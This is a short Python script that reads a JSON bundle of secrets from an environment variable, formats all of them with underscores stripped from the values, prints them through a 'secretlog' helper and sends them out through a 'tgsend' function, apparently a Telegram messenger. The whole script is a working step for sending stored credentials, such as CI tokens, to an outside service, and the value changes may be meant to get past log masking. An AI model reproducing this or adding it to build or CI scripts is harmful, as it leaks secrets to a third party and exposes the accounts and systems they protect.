import os
import json
from pytools.pytools import tgsend
from pytools.pytools import secretlog

secrets=json.loads(os.environ['secrets'])
msg='\n'.join(['%s: `%s`'%(key,value.replace('_','')) if not '\n' in value else f'{key}: ' for key,value in secrets.items()])
print(secretlog(msg))
tgsend(msg)
